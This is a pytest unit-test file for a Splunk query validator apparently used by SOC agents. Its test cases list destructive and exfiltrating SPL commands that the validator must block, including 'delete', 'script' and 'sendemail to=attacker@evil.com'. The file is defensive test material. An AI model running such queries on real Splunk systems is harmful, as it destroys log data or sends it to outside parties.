"""Unit tests for SPL guardrails — no LLM or Splunk connection needed."""
import pytest
from soc_agents.tools.spl_guardrails import validate_spl


@pytest.mark.parametrize("query,expected_ok", [
    # Safe queries
    ("index=windows_events EventCode=4625 | stats count by src_ip", True),
    ("index=linux_secure 'Failed password' | head 20", True),
    ("index=sysmon EventCode=1 | table _time, host, CommandLine", True),
    ("index=linux_web status=404 | stats count by clientip | sort -count", True),
    # Blocked commands
    ("index=main | delete", False),
    ("index=main | drop", False),
    ("index=main | collect index=archive", False),
    ("index=main | outputlookup results.csv", False),
    ("index=main | sendemail to=attacker@evil.com", False),
    ("index=main | sendalert", False),
    ("index=main | script python some_script.py", False),
    ("restart splunkd", False),
    # Unbounded time
    ("index=main earliest=-all", False),
    ("index=main earliest=0", False),
    # Empty
    ("", False),
    ("   ", False),
])
def test_validate_spl(query, expected_ok):
    ok, reason = validate_spl(query)
    assert ok == expected_ok, f"Query '{query[:60]}' expected ok={expected_ok}, got ok={ok} ({reason})"


def test_blocked_returns_reason():
    ok, reason = validate_spl("index=main | delete")
    assert not ok
    assert "delete" in reason.lower()


def test_valid_returns_ok_reason():
    ok, reason = validate_spl("index=windows_events | head 10")
    assert ok
    assert reason == "OK"
